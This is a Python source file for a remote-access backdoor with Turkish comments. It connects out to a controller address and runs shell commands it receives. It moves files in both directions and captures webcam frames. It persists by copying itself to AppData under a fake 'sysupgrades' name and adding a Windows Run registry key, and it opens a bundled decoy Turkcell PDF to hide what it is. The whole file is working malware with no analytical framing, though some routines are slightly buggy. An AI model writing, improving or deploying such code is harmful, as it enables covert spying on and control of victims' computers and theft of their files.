import socket
import subprocess
import json
import base64
import cv2
import time
import os
import shutil
import sys

class BackDoor:
    def __init__(self, ip, port):
        self.my_connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.my_connection.connect((ip, port))

    def json_send(self, data):
        json_data = json.dumps(data)
        self.my_connection.send(json_data.encode())

    def json_receive(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.my_connection.recv(1024).decode()
                return json.loads(json_data)
            except ValueError:
                continue

    def command_execution(self, command):
        return subprocess.check_output(command, shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)

    def exec_cd_command(self, directory):
        os.chdir(directory)
        return "Cd to " + directory

    def exec_download_command(self, path):
        with open(path, "rb") as dw_file:
            return base64.b64decode(dw_file.read())

    def save_file(self, path, content):
        with open(path, "wb") as dw_file:
            dw_file.write(base64.b64decode(content))
            return "Download OK!"

    def capture_webcam(self):
        video_capture = cv2.VideoCapture(0)  # 0, varsayılan kamera için
        frames = []
        for _ in range(3):
            ret, frame = video_capture.read()
            frames.append(frame)
            time.sleep(3)
        video_capture.release()
        return frames

    def add_to_registry(self):
        new_file = os.environ["appdata"] + "\\sysupgrades.exe"
        if not os.path.exists(new_file):
            shutil.copyfile(sys.executable, new_file)
            regedit_command = "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v upgrade /t REG_SZ /d " + new_file    #  dosyanın bulunduğu konum..
            subprocess.call(regedit_command, shell=True)

    def open_added_file(self): # eğer pdf veya jpeg gibi birşey ile birleştirilecekse birleştirilen dosyanın açılmasını sağlar..
        added_file = sys._MEIPASS + "\\Turkcell-EFR2020-TR.pdf"
        subprocess.Popen(added_file, shell=True)


    def start_backdoor(self):
        self.open_added_file()
        while True:
            self.add_to_registry()
            command = self.json_receive()
            try:
                if command[0] == "quit":
                    self.my_connection.close()
                    exit()
                elif command[0] == "cd" and len(command) > 1:
                    command_output = self.exec_cd_command(command[1])
                elif command[0] == "download":
                    command_output = self.exec_download_command(command[1])
                elif command[0] == "upload":
                    command_output = self.save_file(command[1], command[2])
                elif command[0] == "webcam":
                    command_output = self.capture_webcam()
                else:
                    command_output = self.command_execution(command)
            except Exception:
                command_output = "Error!"
            self.json_send(command_output)


my_backdoor_object = BackDoor("ip", 8080)
my_backdoor_object.start_backdoor()
